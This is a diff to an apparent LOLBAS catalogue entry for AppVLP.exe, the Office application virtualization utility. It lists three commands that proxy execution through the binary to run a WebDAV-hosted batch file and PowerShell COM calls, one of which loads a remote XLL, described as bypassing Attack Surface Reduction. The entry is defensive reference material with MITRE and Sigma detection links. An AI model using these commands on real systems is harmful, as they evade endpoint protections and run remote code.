@@ -1,8 +1,8 @@
 ---
 Name: Appvlp.exe
-Description: Application Virtualization Utility Included with Microsoft Office 2016 
-Author: ''
-Created: '2018-05-25'
+Description: Application Virtualization Utility Included with Microsoft Office 2016
+Author: 'Oddvar Moe'
+Created: 2018-05-25
 Commands:
   - Command: AppVLP.exe \\webdav\calc.bat
     Usecase: Execution of BAT file hosted on Webdav server.
@@ -10,7 +10,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows 10 w/Office 2016
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
@@ -18,7 +17,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows 10 w/Office 2016
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
@@ -26,7 +24,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows 10 w/Office 2016
 Full_Path:
   - Path: C:\Program Files\Microsoft Office\root\client\appvlp.exe
@@ -34,7 +31,7 @@ Full_Path:
 Code_Sample:
   - Code:
 Detection:
-  - IOC:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/8b170ff5628376c87632635a5fde4e48bba70275/rules/windows/builtin/win_asr_bypass_via_appvlp_re.yml
 Resources:
   - Link: https://github.com/MoooKitty/Code-Execution
   - Link: https://twitter.com/moo_hax/status/892388990686347264
@@ -47,4 +44,3 @@ Acknowledgement:
     Handle: '@moo_hax'
   - Person: Matt Wilson
     Handle: '@enigma0x3'
----
